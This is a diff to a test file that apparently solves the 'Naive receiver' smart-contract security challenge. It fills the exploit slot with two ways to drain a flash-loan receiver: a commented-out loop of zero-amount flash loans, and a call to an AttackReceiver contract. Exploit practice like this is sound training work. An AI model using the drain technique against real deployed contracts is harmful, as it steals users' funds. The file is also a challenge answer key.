@@ -3,6 +3,8 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 
 const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
 const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
+// method2
+const AttackReceiver = contract.fromArtifact('AttackReceiver');
 
 const { expect } = require('chai');
 
@@ -31,7 +33,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // method 1
+        // while(await balance.current(this.receiver.address) > 0) {
+        //     await this.pool.flashLoan(this.receiver.address, 0);
+        // }
+        // method 2
+        const attack = await AttackReceiver.new();
+        await attack.attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
